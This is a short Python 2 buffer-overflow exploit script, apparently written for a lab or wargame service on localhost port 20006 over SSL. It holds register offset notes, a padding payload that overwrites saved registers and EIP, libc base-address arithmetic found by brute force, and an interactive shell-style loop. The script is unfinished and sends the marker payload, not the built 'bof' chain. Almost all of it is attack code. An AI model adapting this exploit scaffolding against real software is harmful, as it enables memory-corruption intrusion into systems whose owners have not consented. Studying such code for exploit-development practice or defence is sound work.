#!/usr/bin/python
import socket
import struct
import ssl
import time
import telnetlib

v = ('127.0.0.1', 20006)

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(v)
s = ssl.wrap_socket(s)
print s.recv(1024)


# Payload
# EIP = 60
# EDI = 52
# ESI = 48
# EBP = 56
# EBX  = 44


payload = 'A'*44  # Paddings
payload += 'BBBB' # EBX
payload += 'CCCC' # ESI
payload += 'DDDD' # EDI
payload += 'EEEE' # EBP
payload += 'FFFF' # EIP


# Got Control Over 
# EAX = EAX - 
# EDX = 64 Offset 
# ESI = 64 Offset
#  mov    eax,DWORD PTR [esi+0x55c]

addr = 0xb74bf000 # libc base address
addr += 0x10 # why 0x10 ? hmm, little brute force  testing
bof = payload
bof += struct.pack('I', addr + 12) # Just Paddings
bof += struct.pack('I', addr + 8) 
bof += struct.pack('I', addr + 4) 

s.send('s suraj -2'+"\n")
s.send(payload)
raw_input('')
s.settimeout(2)


while True:
	try:
		time.sleep(0.5)
		print s.recv(1024)
	except:
		pass
	s.send(raw_input(' : ')+'\n')

s.close()


